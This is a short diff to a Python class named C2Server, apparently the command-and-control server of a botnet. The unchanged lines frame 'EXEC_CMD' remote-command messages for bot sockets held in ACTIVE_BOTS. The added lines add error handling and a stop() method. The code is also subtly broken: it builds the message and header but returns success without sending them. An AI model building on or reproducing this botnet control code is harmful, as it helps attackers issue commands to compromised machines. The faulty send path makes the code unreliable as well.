@@ -107,3 +107,12 @@ class C2Server:
             client_socket = ACTIVE_BOTS[session_id]['socket']
             cmd_bytes = f"EXEC_CMD{cmd}".encode('utf-8')
             header = struct.pack('I', len(cmd_bytes))
+            return True
+        except Exception as e:
+            print(f"[C2] Send error to {session_id}: {e}")
+            return False
+            
+    def stop(self):
+        self.is_running = False
+        if self.server_socket:
+            self.server_socket.close()
